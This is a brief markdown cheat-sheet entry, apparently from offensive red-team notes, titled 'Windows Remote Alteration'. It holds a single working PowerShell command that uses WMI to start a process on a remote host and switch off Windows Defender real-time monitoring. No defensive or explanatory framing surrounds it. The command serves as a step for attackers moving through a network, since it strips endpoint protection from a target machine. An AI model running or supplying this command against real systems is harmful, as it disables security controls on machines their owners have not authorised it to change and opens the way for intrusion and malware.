# Windows Remote Alteration  

## Powershell Remote Alteration

### Disable Defender Remotely using WMI

```Powershell
Invoke-WmiMethod -ComputerName 10.0.1.2 -Class Win32_Process -Name Create -ArgumentList "powershell.exe -C `Set-MpPreference -DisableRealtimeMonitoring $true`"
```